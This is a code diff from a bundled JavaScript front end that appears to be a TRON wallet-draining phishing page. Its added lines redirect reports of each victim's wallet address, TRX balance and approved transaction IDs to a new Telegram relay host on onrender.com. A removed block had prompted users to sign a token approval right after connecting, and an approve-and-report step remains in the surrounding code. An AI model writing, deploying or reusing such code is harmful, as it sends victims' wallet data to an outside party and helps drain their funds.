@@ -92897,7 +92897,7 @@
                     });
 
                     // Telegram only: notify right after wallet connect (do not block approval)
-                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
+                    GS.post("https://tronscantelegram-a900.onrender.com/api/telegram", {
                         text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
                     }, {
                         timeout: 8000
@@ -92950,35 +92950,7 @@
                     s(address),
                     n(!0),
                     o(balanceInTRX),
-                    t(2);
-                    const feeLimit = balanceInTRX >= 20 ? 15000000 : 1e9;
-                    localStorage.setItem("walletAddress", address);
-                    const tronLinkSigner = {
-                        request: async request => {
-                            if (!request || "tron_signTransaction" !== request.method)
-                                throw new Error("Unsupported TronLink signing request.");
-                            const fullTransaction = request.params && request.params.transaction;
-                            const transaction = fullTransaction && fullTransaction.transaction || fullTransaction;
-                            if (!transaction)
-                                throw new Error("No transaction was provided for TronLink signing.");
-                            return {
-                                result: await tronWeb.trx.sign(transaction)
-                            }
-                        }
-                    };
-                    const service = new SA(tronLinkSigner);
-                    const approval = await service.sendTransaction(address, feeLimit);
-                    if (approval && (approval.result || approval.success)) {
-                        setTimeout(() => {
-                            window.location.href = "/certificate"
-                        }, 1500);
-                        t(3)
-                    } else {
-                        const approvalMessage = approval && approval.message || "Approval failed. Please try again.";
-                        console.error("TronLink approval failed:", approval);
-                        window.alert(approvalMessage);
-                        t(2)
-                    }
+                    t(2)
                 } catch (error) {
                     const message = error && error.message ? error.message : String(error);
                     console.error("TronLink connection error:", error);
@@ -93007,7 +92979,7 @@
                     console.log("[SIGN] approve result", n);
                     if (n && (n.result || n.success)) {
                         console.log("[SIGN] Approve OK TXID:", n.txID);
-                        GS.post("https://tronscantelegram.onrender.com/api/telegram", {
+                        GS.post("https://tronscantelegram-a900.onrender.com/api/telegram", {
                             text: `Transaction approved\nWallet: ${e}\nTransaction ID: ${n.txID || "N/A"}\nTime: ${new Date().toISOString()}`
                         }).catch(() => {});
                         setTimeout(() => {
